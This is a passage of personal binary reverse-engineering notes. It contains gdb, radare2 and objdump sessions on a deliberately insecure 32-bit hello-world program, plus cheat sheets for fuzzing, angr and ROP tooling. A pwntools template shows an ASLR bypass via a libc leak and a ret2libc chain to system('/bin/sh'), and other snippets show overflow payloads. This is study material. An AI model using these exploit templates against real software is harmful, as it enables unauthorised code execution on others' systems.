 8049193:	b8 00 00 00 00       	mov    $0x0,%eax
 8049198:	8d 65 f8             	lea    -0x8(%ebp),%esp
 804919b:	59                   	pop    %ecx
 804919c:	5b                   	pop    %ebx
 804919d:	5d                   	pop    %ebp
 804919e:	8d 61 fc             	lea    -0x4(%ecx),%esp
 80491a1:	c3                   	ret

080491a2 <__x86.get_pc_thunk.ax>:
 80491a2:	8b 04 24             	mov    (%esp),%eax
 80491a5:	c3                   	ret

Disassembly of section .fini:

080491a8 <_fini>:
 80491a8:	53                   	push   %ebx
 80491a9:	83 ec 08             	sub    $0x8,%esp
 80491ac:	e8 ef fe ff ff       	call   80490a0 <__x86.get_pc_thunk.bx>
 80491b1:	81 c3 73 20 00 00    	add    $0x2073,%ebx
 80491b7:	83 c4 08             	add    $0x8,%esp
 80491ba:	5b                   	pop    %ebx
 80491bb:	c3                   	ret
```

#### gdb / r2
```bash
# start gdb
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ gdb -q ./32bit_InSecure_hello_world
Reading symbols from ./32bit_InSecure_hello_world...
(No debugging symbols found in ./32bit_InSecure_hello_world)
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  __libc_start_main@plt
0x08049040  printf@plt
0x08049050  _start
0x0804907d  __wrap_main
0x08049090  _dl_relocate_static_pie
0x080490a0  __x86.get_pc_thunk.bx
0x080490b0  deregister_tm_clones
0x080490f0  register_tm_clones
0x08049130  __do_global_dtors_aux
0x08049160  frame_dummy
0x08049166  main
0x080491a2  __x86.get_pc_thunk.ax
0x080491a8  _fini
(gdb) set disassembly-flavor intel
(gdb) diss main
Undefined command: "diss".  Try "help".
(gdb) diass main
Undefined command: "diass".  Try "help".
(gdb) disass main
Dump of assembler code for function main:
   0x08049166 <+0>:     lea    ecx,[esp+0x4]
   0x0804916a <+4>:     and    esp,0xfffffff0
   0x0804916d <+7>:     push   DWORD PTR [ecx-0x4]
   0x08049170 <+10>:    push   ebp
   0x08049171 <+11>:    mov    ebp,esp
   0x08049173 <+13>:    push   ebx
   0x08049174 <+14>:    push   ecx
   0x08049175 <+15>:    call   0x80491a2 <__x86.get_pc_thunk.ax>
   0x0804917a <+20>:    add    eax,0x20aa
   0x0804917f <+25>:    sub    esp,0xc
   0x08049182 <+28>:    lea    edx,[eax-0x121c]
   0x08049188 <+34>:    push   edx
   0x08049189 <+35>:    mov    ebx,eax
   0x0804918b <+37>:    call   0x8049040 <printf@plt>
   0x08049190 <+42>:    add    esp,0x10
   0x08049193 <+45>:    mov    eax,0x0
   0x08049198 <+50>:    lea    esp,[ebp-0x8]
   0x0804919b <+53>:    pop    ecx
   0x0804919c <+54>:    pop    ebx
   0x0804919d <+55>:    pop    ebp
   0x0804919e <+56>:    lea    esp,[ecx-0x4]
   0x080491a1 <+59>:    ret
End of assembler dump.
(gdb) b *main
Breakpoint 1 at 0x8049166
(gdb) run
Starting program: /home/kali/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build/32bit_InSecure_hello_world 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x08049166 in main ()
(gdb) display/i $pc
1: x/i $pc
=> 0x8049166 <main>:    lea    ecx,[esp+0x4]
(gdb) info registers eax
eax            0x804907d           134516861
(gdb) x/s 0x804907d
0x804907d <_start+45>:  "\351", <incomplete sequence \344>
quit # ; exit gdb

## advanced
(gdb) info files
Symbols from "/home/kali/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build/32bit_InSecure_hello_world".
Native process:
        Using the running image of child process 22205.
        While running this, GDB does not access memory from...
Local exec file:
        `/home/kali/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build/32bit_InSecure_hello_world', file type elf32-i386.
        Entry point: 0x8049050
        0x08048194 - 0x080481b8 is .note.gnu.build-id
        0x080481b8 - 0x080481cb is .interp
        0x080481cc - 0x080481ec is .gnu.hash
        0x080481ec - 0x0804823c is .dynsym
        0x0804823c - 0x08048293 is .dynstr
        0x08048294 - 0x0804829e is .gnu.version
        0x080482a0 - 0x080482d0 is .gnu.version_r
        0x080482d0 - 0x080482d8 is .rel.dyn
        0x080482d8 - 0x080482e8 is .rel.plt
        0x08049000 - 0x08049020 is .init
        0x08049020 - 0x08049050 is .plt
        0x08049050 - 0x080491a6 is .text
        0x080491a8 - 0x080491bc is .fini
        0x0804a000 - 0x0804a014 is .rodata
        0x0804a014 - 0x0804a048 is .eh_frame_hdr
        0x0804a048 - 0x0804a110 is .eh_frame
        0x0804a110 - 0x0804a130 is .note.ABI-tag
        0x0804b130 - 0x0804b134 is .init_array
        0x0804b134 - 0x0804b138 is .fini_array
        0x0804b138 - 0x0804b220 is .dynamic
        0x0804b220 - 0x0804b224 is .got
        0x0804b224 - 0x0804b238 is .got.plt
        0x0804b238 - 0x0804b240 is .data
        0x0804b240 - 0x0804b244 is .bss
        0xf7fc7154 - 0xf7fc7178 is .note.gnu.build-id in /lib/ld-linux.so.2
        0xf7fc7178 - 0xf7fc72b8 is .hash in /lib/ld-linux.so.2
        0xf7fc72b8 - 0xf7fc741c is .gnu.hash in /lib/ld-linux.so.2
        0xf7fc741c - 0xf7fc76ac is .dynsym in /lib/ld-linux.so.2
        0xf7fc76ac - 0xf7fc795f is .dynstr in /lib/ld-linux.so.2
        0xf7fc7960 - 0xf7fc79b2 is .gnu.version in /lib/ld-linux.so.2
        0xf7fc79b4 - 0xf7fc7ac4 is .gnu.version_d in /lib/ld-linux.so.2
        0xf7fc7ac4 - 0xf7fc7acc is .rel.dyn in /lib/ld-linux.so.2
        0xf7fc7acc - 0xf7fc7ad8 is .relr.dyn in /lib/ld-linux.so.2
        0xf7fc8000 - 0xf7feb751 is .text in /lib/ld-linux.so.2
        0xf7fec000 - 0xf7ff21e0 is .rodata in /lib/ld-linux.so.2
        0xf7ff21e0 - 0xf7ff2d74 is .eh_frame_hdr in /lib/ld-linux.so.2
        0xf7ff2d74 - 0xf7ffa2e8 is .eh_frame in /lib/ld-linux.so.2
        0xf7ffb9c0 - 0xf7ffcf2c is .data.rel.ro in /lib/ld-linux.so.2
        0xf7ffcf2c - 0xf7ffcfec is .dynamic in /lib/ld-linux.so.2
        0xf7ffcfec - 0xf7ffcff8 is .got in /lib/ld-linux.so.2
        0xf7ffd000 - 0xf7ffd638 is .data in /lib/ld-linux.so.2
        0xf7ffd640 - 0xf7ffda54 is .bss in /lib/ld-linux.so.2
        0xf7fc50b4 - 0xf7fc50f8 is .hash in system-supplied DSO at 0xf7fc5000
        0xf7fc50f8 - 0xf7fc5148 is .gnu.hash in system-supplied DSO at 0xf7fc5000
        0xf7fc5148 - 0xf7fc5208 is .dynsym in system-supplied DSO at 0xf7fc5000
        0xf7fc5208 - 0xf7fc52d6 is .dynstr in system-supplied DSO at 0xf7fc5000
        0xf7fc52d6 - 0xf7fc52ee is .gnu.version in system-supplied DSO at 0xf7fc5000
        0xf7fc52f0 - 0xf7fc5344 is .gnu.version_d in system-supplied DSO at 0xf7fc5000
        0xf7fc5344 - 0xf7fc53d4 is .dynamic in system-supplied DSO at 0xf7fc5000
        0xf7fc53d4 - 0xf7fc53e0 is .rodata in system-supplied DSO at 0xf7fc5000
        0xf7fc53e0 - 0xf7fc5444 is .note in system-supplied DSO at 0xf7fc5000
        0xf7fc5444 - 0xf7fc5468 is .eh_frame_hdr in system-supplied DSO at 0xf7fc5000
        0xf7fc5468 - 0xf7fc5574 is .eh_frame in system-supplied DSO at 0xf7fc5000
        0xf7fc5580 - 0xf7fc69d6 is .text in system-supplied DSO at 0xf7fc5000
        0xf7fc69d6 - 0xf7fc6ae0 is .altinstructions in system-supplied DSO at 0xf7fc5000
        0xf7fc6ae0 - 0xf7fc6b2c is .altinstr_replacement in system-supplied DSO at 0xf7fc5000
        0xf7d651d4 - 0xf7d651f8 is .note.gnu.build-id in /lib32/libc.so.6
        0xf7d651f8 - 0xf7d697b0 is .hash in /lib32/libc.so.6
        0xf7d697b0 - 0xf7d6ecdc is .gnu.hash in /lib32/libc.so.6
        0xf7d6ecdc - 0xf7d7c3ac is .dynsym in /lib32/libc.so.6
        0xf7d7c3ac - 0xf7d856c1 is .dynstr in /lib32/libc.so.6
        0xf7d856c2 - 0xf7d8719c is .gnu.version in /lib32/libc.so.6
        0xf7d8719c - 0xf7d878f0 is .gnu.version_d in /lib32/libc.so.6
        0xf7d878f0 - 0xf7d87940 is .gnu.version_r in /lib32/libc.so.6
        0xf7d87940 - 0xf7d87c30 is .rel.dyn in /lib32/libc.so.6
        0xf7d87c30 - 0xf7d87cf0 is .rel.plt in /lib32/libc.so.6
        0xf7d87cf0 - 0xf7d87e10 is .relr.dyn in /lib32/libc.so.6
        0xf7d88000 - 0xf7d88190 is .plt in /lib32/libc.so.6
        0xf7d88190 - 0xf7d881a0 is .plt.got in /lib32/libc.so.6
        0xf7d881c0 - 0xf7f10849 is .text in /lib32/libc.so.6
        0xf7f11000 - 0xf7f36488 is .rodata in /lib32/libc.so.6
        0xf7f36488 - 0xf7f3649b is .interp in /lib32/libc.so.6
        0xf7f3649c - 0xf7f3e680 is .eh_frame_hdr in /lib32/libc.so.6
        0xf7f3e680 - 0xf7f95330 is .eh_frame in /lib32/libc.so.6
        0xf7f95330 - 0xf7f95a4a is .gcc_except_table in /lib32/libc.so.6
        0xf7f95a4c - 0xf7f95a6c is .note.ABI-tag in /lib32/libc.so.6
        0xf7f96548 - 0xf7f96550 is .tdata in /lib32/libc.so.6
        0xf7f96550 - 0xf7f96598 is .tbss in /lib32/libc.so.6
        0xf7f96550 - 0xf7f96560 is .init_array in /lib32/libc.so.6
        0xf7f96560 - 0xf7f97d0c is .data.rel.ro in /lib32/libc.so.6
        0xf7f97d0c - 0xf7f97e14 is .dynamic in /lib32/libc.so.6
        0xf7f97e14 - 0xf7f97ff0 is .got in /lib32/libc.so.6
        0xf7f98000 - 0xf7f98eb8 is .data in /lib32/libc.so.6
        0xf7f98ec0 - 0xf7fa2930 is .bss in /lib32/libc.so.6
(gdb) quit
A debugging session is active.

        Inferior 1 [process 22205] will be killed.

Quit anyway? (y or n) y
                           
# start r2
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ r2 -A ./32bit_InSecure_hello_world 
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x08049050]> aaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x08049050]> afl
0x08049030    1      6 sym.imp.__libc_start_main
0x08049040    1      6 sym.imp.printf
0x08049050    1     40 entry0
0x08049079    1      4 fcn.08049079
0x080490b0    4     40 sym.deregister_tm_clones
0x080490f0    4     53 sym.register_tm_clones
0x08049130    3     34 entry.fini0
0x08049160    1      6 entry.init0
0x080490a0    1      4 sym.__x86.get_pc_thunk.bx
0x080491a8    1     20 sym._fini
0x08049090    1      1 sym._dl_relocate_static_pie
0x08049166    1     60 main
0x080491a2    1      4 sym.__x86.get_pc_thunk.ax
0x08049000    3     32 sym._init
[0x08049050]> info
ERROR: Invalid `n` subcommand, try `i?`
[0x08049050]> i
fd       3
file     ./32bit_InSecure_hello_world
size     0x2c2c
humansz  11.0K
mode     r-x
format   elf
iorw     false
block    0x100
type     EXEC (Executable file)
arch     x86
baddr    0x8048000
binsz    10146
bintype  elf
bits     32
canary   false
injprot  false
class    ELF32
compiler GCC: (Debian 14.3.0-8) 14.3.0
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
nx       false
os       linux
pic      false
relocs   true
relro    no
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
[0x08049050]> pdf @ main
            ; CODE XREF from loc.__wrap_main @ 
┌ 60: int main (char **argv);
│ `- args(sp[0x4..0x4]) vars(1:sp[0x10..0x10])
│           0x08049166      8d4c2404       lea ecx, [argv]
│           0x0804916a      83e4f0         and esp, 0xfffffff0
│           0x0804916d      ff71fc         push dword [ecx - 4]
│           0x08049170      55             push ebp
│           0x08049171      89e5           mov ebp, esp
│           0x08049173      53             push ebx
│           0x08049174      51             push ecx
│           0x08049175      e828000000     call sym.__x86.get_pc_thunk.ax
│           0x0804917a      05aa200000     add eax, 0x20aa
│           0x0804917f      83ec0c         sub esp, 0xc
│           0x08049182      8d90e4edffff   lea edx, [eax - 0x121c]
│           0x08049188      52             push edx                    ; const char *format
│           0x08049189      89c3           mov ebx, eax
│           0x0804918b      e8b0feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x08049190      83c410         add esp, 0x10
│           0x08049193      b800000000     mov eax, 0
│           0x08049198      8d65f8         lea esp, [var_8h]
│           0x0804919b      59             pop ecx
│           0x0804919c      5b             pop ebx
│           0x0804919d      5d             pop ebp
│           0x0804919e      8d61fc         lea esp, [ecx - 4]
└           0x080491a1      c3             ret
db address # ; breakpoint
dc # ; continue execution
dr  / dr rax # ; show registers / show rax register
dps # ; show program stack
dm / dmm # ; list memory maps
px @ rsp # ; show memory at register pointer
dmp address size # ; dump meomory regision
q # ; quit

## advanced
agg # ; Graph view in CLI 
agf @ main # ; Function graph for 'main'
/ str Secret # ; search for string "Secret" in the binary
/a call # ; searches for 'call' instructions
```

#### GDB Memory Analysis
```bash
# GDB provides powerful commands to examine memory.

# x: examine memory
# Usage: x/[count][format][size] address
#
# count: number of units to display
# format: d(ecimal), x(hex), o(ctal), s(tring), i(nstruction), c(har)
# size: b(yte), h(alfword, 2 bytes), w(ord, 4 bytes), g(iant, 8 bytes)

# Examples:
x/32gx $rsp      # ; show 32 giant words (qwords) from the stack pointer in hex
(gdb) x/32gx $esp
No registers.
(gdb) run
Starting program: /home/kali/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build/32bit_InSecure_hello_world 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x08049166 in main ()
(gdb) x/32gx $esp
0xffffce1c:     0x00000001f7d89cc3      0xffffcedcffffced4
0xffffce2c:     0xf7f97e14ffffce40      0x000000010804907d
0xffffce3c:     0xf7f97e14ffffced4      0xf7ffcb600804b134
0xffffce4c:     0x4d243fc500000000      0x00000000038179d5
0xffffce5c:     0x0000000000000000      0x00000000f7ffcb60
0xffffce6c:     0xf7ffda60c44d7200      0xf7f97e14f7d89c56
0xffffce7c:     0xf7fc7ac4f7d89d88      0x000000000804b134
0xffffce8c:     0x00000000f7ffd000      0xf7d89d09f7fd8390
0xffffce9c:     0x000000010804b224      0x0000000008049050
0xffffceac:     0x0804907d08049078      0xffffced400000001
0xffffcebc:     0x0000000000000000      0xffffceccf7fcbd20
0xffffcecc:     0x00000001f7ffda60      0x00000000ffffd0a1
0xffffcedc:     0xffffd113ffffd104      0xffffd14affffd127
0xffffceec:     0xffffd1a1ffffd180      0xffffd1ccffffd1ae
0xffffcefc:     0xffffd1f8ffffd1e8      0xffffd213ffffd209
0xffffcf0c:     0xffffd231ffffd220      0xffffd2ddffffd250
x/10i $rip      # ; show 10 instructions from the instruction pointer
(gdb) x/10i $eip
=> 0x8049166 <main>:    lea    ecx,[esp+0x4]
   0x804916a <main+4>:  and    esp,0xfffffff0
   0x804916d <main+7>:  push   DWORD PTR [ecx-0x4]
   0x8049170 <main+10>: push   ebp
   0x8049171 <main+11>: mov    ebp,esp
   0x8049173 <main+13>: push   ebx
   0x8049174 <main+14>: push   ecx
   0x8049175 <main+15>: call   0x80491a2 <__x86.get_pc_thunk.ax>
   0x804917a <main+20>: add    eax,0x20aa
   0x804917f <main+25>: sub    esp,0xc
x/s 0x4005a0    # ; show string at address
(gdb) x/s 0x00000001f7d89cc3
0xf7d89cc3:     "\203\304\020\203\354\fP\350\001\236\001"
x/40wx 0x7fffffffe1f0 # ; show 40 words (dwords) in hex
(gdb) x/40wx 0x00000001f7d89cc3
0xf7d89cc3:     0x8310c483      0xe8500cec      0x00019e01      0x068b2ce8
0xf7d89cd3:     0x24048b00      0xa8a883f0      0x01000002      0x01ba1a74
0xf7d89ce3:     0x31000000      0xb48d2edb      0x00000026      0x65d08900
0xf7d89cf3:     0x001015ff      0xf5eb0000      0xc7ebc031      0x56575590
0xf7d89d03:     0xa010e853      0xc3810015      0x0020e10b      0x8b1cec83
0xf7d89d13:     0x8b442444      0x853c2474      0x831074c0      0x006a04ec
0xf7d89d23:     0xe850006a      0x00019505      0x8b10c483      0x000110bb
0xf7d89d33:     0x832f8b00      0x850f02e5      0x00000105      0x01bc838b
0xf7d89d43:     0x008b0000      0x3d74f685      0x5004ec83      0x402474ff
0xf7d89d53:     0x402474ff      0x938bd6ff      0x000001b0      0x8310c483

# info proc mappings: show memory mappings of the process
(gdb) info proc mappings
process 26116
Mapped address spaces:

Start Addr End Addr   Size       Offset     Perms File 
0x08048000 0x08049000 0x1000     0x0        r--p  /home/kali/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build/32bit_InSecure_hello_world 
0x08049000 0x0804a000 0x1000     0x1000     r-xp  /home/kali/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build/32bit_InSecure_hello_world 
0x0804a000 0x0804b000 0x1000     0x2000     r--p  /home/kali/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build/32bit_InSecure_hello_world 
0x0804b000 0x0804c000 0x1000     0x2000     rw-p  /home/kali/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build/32bit_InSecure_hello_world 
0xf7d65000 0xf7d88000 0x23000    0x0        r--p  /usr/lib32/libc.so.6 
0xf7d88000 0xf7f11000 0x189000   0x23000    r-xp  /usr/lib32/libc.so.6 
0xf7f11000 0xf7f96000 0x85000    0x1ac000   r--p  /usr/lib32/libc.so.6 
0xf7f96000 0xf7f98000 0x2000     0x231000   r--p  /usr/lib32/libc.so.6 
0xf7f98000 0xf7f99000 0x1000     0x233000   rw-p  /usr/lib32/libc.so.6 
0xf7f99000 0xf7fa3000 0xa000     0x0        rw-p   
0xf7fbd000 0xf7fbf000 0x2000     0x0        rw-p   
0xf7fbf000 0xf7fc3000 0x4000     0x0        r--p  [vvar] 
0xf7fc3000 0xf7fc5000 0x2000     0x0        r--p  [vvar_vclock] 
0xf7fc5000 0xf7fc7000 0x2000     0x0        r-xp  [vdso] 
0xf7fc7000 0xf7fc8000 0x1000     0x0        r--p  /usr/lib32/ld-linux.so.2 
0xf7fc8000 0xf7fec000 0x24000    0x1000     r-xp  /usr/lib32/ld-linux.so.2 
0xf7fec000 0xf7ffb000 0xf000     0x25000    r--p  /usr/lib32/ld-linux.so.2 
0xf7ffb000 0xf7ffd000 0x2000     0x33000    r--p  /usr/lib32/ld-linux.so.2 
0xf7ffd000 0xf7ffe000 0x1000     0x35000    rw-p  /usr/lib32/ld-linux.so.2 
0xfffdd000 0xffffe000 0x21000    0x0        rwxp  [stack] 
# find: search memory for a sequence of bytes
# find [start_addr], [end_addr], <byte1>, <byte2>, ...
find 0x400000, 0x401000, 0x55, 0x48, 0x89, 0xe5

# Using GDB extensions like pwndbg/gef makes this much easier:
# vmmap: show memory mappings with permissions
# telescope: show stack/heap with context (pointers, strings)
# heap: show detailed heap layout (pwndbg)
# bins: show malloc bins (pwndbg)
```

#### Bypassing ASLR with a Leak
```python
# ASLR (Address Space Layout Randomization) randomizes the base address
# of libraries, stack, and heap. To bypass it, you need an info leak.

# 1. Find a vulnerability that leaks an address (e.g., a format string
#    vulnerability or an out-of-bounds read).
# 2. The leaked address will be a pointer into a randomized region,
#    often a libc address or a stack address.
# 3. Calculate the base address of that region. You need to know the
#    version of the library (e.g., libc) on the target system to know
#    the offset of the leaked function from the library's base.

# Example exploit logic using pwntools:
from pwn import *

# --- Setup ---
# Assumes a local binary, but could be a remote connection
p = process('./binary_with_leak')
# ELF objects help find symbol offsets
elf = ELF('./binary_with_leak')
# You need the specific libc version of the target
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# --- Leak Phase ---
# Assume we have a vulnerability to leak the address of 'puts' from the GOT
# The payload to trigger the leak depends on the vulnerability
leak_payload = b'...'
p.sendline(leak_payload)

# Receive and parse the output to get the leaked address
p.recvuntil(b'some known output before the leak')
leaked_puts_str = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_str.ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leaked_puts_addr)}")

# --- Calculation Phase ---
# Calculate the base address of libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

# --- Exploitation Phase ---
# Now you can calculate the address of any other function or gadget in libc
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# The offset for this gadget must be found with ROPgadget or similar
rop_pop_rdi = libc.address + 0x000000000002155f # Example gadget offset

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Build the final payload using the calculated addresses
payload = b'A' * 104 # Padding to overflow
payload += p64(rop_pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

#### cfg
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ objdump -d ./32bit_InSecure_hello_world | awk '/^[[:xdigit:]]+:/ {address=$1} /call|jmp|je|jne|jg|jl|jz|jnz/ {print address, $0}'
  8049004:      e8 97 00 00 00          call   80490a0 <__x86.get_pc_thunk.bx>
  8049017:      74 02                   je     804901b <_init+0x1b>
  8049019:      ff d0                   call   *%eax
  8049026:      ff 25 2c b2 04 08       jmp    *0x804b22c
  8049030:      ff 25 30 b2 04 08       jmp    *0x804b230
  804903b:      e9 e0 ff ff ff          jmp    8049020 <_init+0x20>
  8049040:      ff 25 34 b2 04 08       jmp    *0x804b234
  804904b:      e9 d0 ff ff ff          jmp    8049020 <_init+0x20>
  804905b:      e8 19 00 00 00          call   8049079 <_start+0x29>
  8049073:      e8 b8 ff ff ff          call   8049030 <__libc_start_main@plt>
  804907d:      e9 e4 00 00 00          jmp    8049166 <main>
  80490ba:      74 24                   je     80490e0 <deregister_tm_clones+0x30>
  80490c3:      74 1b                   je     80490e0 <deregister_tm_clones+0x30>
  80490d0:      ff d0                   call   *%eax
  8049106:      74 20                   je     8049128 <register_tm_clones+0x38>
  804910f:      74 17                   je     8049128 <register_tm_clones+0x38>
  804911d:      ff d2                   call   *%edx
  804913b:      75 1b                   jne    8049158 <__do_global_dtors_aux+0x28>
  8049143:      e8 68 ff ff ff          call   80490b0 <deregister_tm_clones>
  8049164:      eb 8a                   jmp    80490f0 <register_tm_clones>
  8049175:      e8 28 00 00 00          call   80491a2 <__x86.get_pc_thunk.ax>
  804918b:      e8 b0 fe ff ff          call   8049040 <printf@plt>
  80491ac:      e8 ef fe ff ff          call   80490a0 <__x86.get_pc_thunk.bx>
# Ghidra -> Display Function Graph
```
![[G_HW_CFG.png]]
#### Ghidra

#### GDB Extensions (pwndbg/gef/peda)
```bash
# These extensions greatly enhance GDB for exploit development.
# Installation instructions are specific to each tool.

# Example commands in pwndbg/gef:
heap # ; view heap layout
bins # ; view malloc bins
telescope # ; view a region of memory with context (pointers, strings)
vmmap # ; view memory mapping, similar to /proc/pid/maps
ropper # ; search for ROP gadgets (if integrated)

# Note: Choose one extension (pwndbg, gef, or peda) as they
# generally don't work together. They provide similar core
# features but have different UIs and advanced capabilities.
```

#### ROP Gadgets
```bash
# Tools to find gadgets for Return-Oriented Programming (ROP).
ropper -f binary_name --search "pop rdi; ret"

# ROPgadget basic usage to find all gadgets
ROPgadget --binary binary_name

# Search for specific gadgets
ROPgadget --binary binary_name --only "pop|ret"

# Search for specific strings/bytes in the binary
ROPgadget --binary binary_name --string "/bin/sh"

# Generate a simple ROP chain for execve("/bin/sh", 0, 0)
ROPgadget --binary binary_name --ropchain

# Specify bad characters to avoid in gadget addresses
ROPgadget --binary binary_name --bad-chars "000a"

# Note: These tools are essential for building ROP chains to
# bypass security mitigations like NX (Non-executable stack).
```

#### Exploitation Frameworks
```bash
# pwntools is a powerful Python library for writing exploits.
pip install pwntools
```
```python
# Example pwntools script snippet
from pwn import *

# Start the process
p = process('./binary_name')

# Craft a payload
payload = b'A' * 100
payload += p64(0xdeadbeef) # 64-bit address

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Note: pwntools simplifies many tasks like packing/unpacking data,
# interacting with processes, and remote connections.
```

#### Fuzzing
```bash
# AFL++ is a modern, feature-rich fuzzer.

## Instrumented Fuzzing (White-box)
# This is the most effective method. It requires source code to compile
# the binary with instrumentation.
afl-clang-fast -o binary_name_fuzzed source.c
# or for C++
# afl-clang-fast++ -o binary_name_fuzzed source.cpp

# Create input and output directories
mkdir in out
echo "initial seed data" > in/seed.txt

# Run the fuzzer. The '@@' is a placeholder for the input file.
afl-fuzz -i in -o out ./binary_name_fuzzed @@

## Black-box Fuzzing (QEMU mode)
# Use this when you don't have the source code. It's slower.
# The '-Q' flag enables QEMU mode for binary-only targets.
afl-fuzz -Q -i in -o out ./binary_name @@

# Note: Fuzzing is a highly effective technique for discovering
# memory corruption vulnerabilities. Instrumented fuzzing is much
# faster and more efficient than black-box fuzzing.
```

#### Symbolic Execution
```bash
# Angr is a Python framework for symbolic execution and program analysis.
pip install angr
```
```python
# Example Angr script to find a path to a target address
import angr

proj = angr.Project('./binary_name', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

# Find a path to a specific address (e.g., a "success" message)
target_address = 0x400800
simgr.explore(find=target_address)

if simgr.found:
    solution_state = simgr.found[0]
    print("Solution found!")
    print(solution_state.posix.dumps(0)) # Dump stdin that leads to the solution
else:
    print("No solution found.")

# Note: Symbolic execution explores program paths to find states
# that satisfy certain conditions. It can be used to solve CTF
# challenges or find vulnerabilities.
```

#### conclusion
```shell
# Section to add what I learnt, what I oberved, what changed
```

## Secured

#### File
```bash
file binary_name
```

#### checksec
```bash
pwn checksec binary_name
```

#### ldd
```bash
ldd binary_name
```

#### grep
```bash
grep -i "pattern" binary_name
```

#### readelf
```bash
# elf metadata
readelf -h binary_name
# library fil meta data
readelf -hs lib*.so
```

#### Signature check
```bash
readelf -S binary_name | grep -E "sig|signature"
elfsign verify -e ./binary_name
objdump -h binary_name | grep -E "sig|signature"
```

#### nm / nm -D
```bash
# list symbols - static mode
nm lib*.so
# list symbols - dynamic mode
nm -D lib*.so
# demangle the symbols
nm -D --demangle lib*.so
```

#### strings
```bash
strings binary_name | fzf
```

#### strace / ltrace
```bash
# system calls trace
strace ./binary_name
# -f: follow forks (child processes)
# -s <size>: specify the maximum string size to print (default is 32)
# -o <file>: write the output to a file instead of stderr
# -p <pid>: attach to a running process
# -e <expr>: a qualifying expression (e.g., -e trace=open,close,read,write)
strace -f -s 1024 -o strace.out ./binary_name

# library calls trace
ltrace ./binary_name
# -f: follow forks
# -s <size>: specify the maximum string size to print
# -o <file>: write the output to a file
# -p <pid>: attach to a running process
# -e <expr>: trace specific library calls (e.g., -e 'malloc*')
# -i: print instruction pointer at time of library call
# -C: demangle C++ symbols
ltrace -f -s 1024 -o ltrace.out ./binary_name
```

#### objdump
```bash
# section analysis
objdump -s --section .rodata binary_name # .rodata
# assembly instructions
objdump -d binary_name
```

#### gdb / r2
```bash
# start gdb
gdb binary_name
# gdb commands
info functions # ; list all the functions
disass main # ; disassmeble main function
b *memory_address # ; breakpoint
run # ; executes the binary
display/i $pc # ; display instruction at the current program counter
info registers rax # ; inspect the contents of rax register
x/s memory_address # ; inspect stack
quit # ; exit gdb

## advanced
info files # ; symbols, entry points will be listed
set pagination off # ; doesnt breaks the output
set logging on # ; output will be copied to gdb.txt
set logging redirect on # ; output will be redirect to gdb.txt

# start r2
r2 -A binary_name
# r2 commadns
aaa # ; analyze all
afl # ; list functions
info # ; show binary information
pdf @ main # ; disassemble main function
db address # ; breakpoint
dc # ; continue execution
dr  / dr rax # ; show registers / show rax register
dps # ; show program stack
dm / dmm # ; list memory maps
px @ rsp # ; show memory at register pointer
dmp address size # ; dump meomory regision
q # ; quit

## advanced
agg # ; Graph view in CLI 
agf @ main # ; Function graph for 'main'
/ str Secret # ; search for string "Secret" in the binary
/a call # ; searches for 'call' instructions
```

#### GDB Memory Analysis
```gdb
# GDB provides powerful commands to examine memory.

# x: examine memory
# Usage: x/[count][format][size] address
#
# count: number of units to display
# format: d(ecimal), x(hex), o(ctal), s(tring), i(nstruction), c(har)
# size: b(yte), h(alfword, 2 bytes), w(ord, 4 bytes), g(iant, 8 bytes)

# Examples:
x/32gx $rsp      # ; show 32 giant words (qwords) from the stack pointer in hex
